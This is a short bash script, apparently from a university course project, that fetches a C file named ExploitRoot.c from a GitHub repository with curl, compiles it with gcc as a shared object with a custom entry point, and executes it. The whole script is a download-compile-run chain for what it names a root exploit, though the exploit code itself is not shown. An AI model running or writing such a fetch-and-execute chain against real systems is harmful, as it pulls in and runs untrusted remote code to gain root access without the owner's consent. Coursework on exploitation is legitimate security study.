#!/bin/bash

# Step 1: Download the C exploit source from this GitHub repo
curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/ExploitRoot.c -o /tmp/ExploitRoot.c || exit

# Step 2: Compile it
gcc -shared /tmp/ExploitRoot.c -o /tmp/ExploitRoot -Wl,-e,entry -fPIC || exit

# Step 3: Execute it
/tmp/ExploitRoot
